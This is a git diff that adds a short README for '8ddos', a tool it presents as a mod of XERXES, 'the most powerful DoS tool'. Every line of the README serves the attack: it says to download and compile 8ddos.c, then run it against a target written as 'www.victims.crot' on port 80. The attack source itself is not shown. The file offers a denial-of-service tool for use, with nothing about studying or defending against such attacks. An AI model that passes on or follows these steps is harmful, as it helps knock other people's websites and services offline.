@@ -1,0 +1,7 @@
+# 8ddos
+8DDOS mod From XERXES the most powerful DoS tool
+Download the File 8ddos.c to your Desktop
+Open Terminal and type these commands
+cd Desktop
+gcc 8ddos.c -o 8ddos
+USAGE : ./8ddos www.victims.crot 80
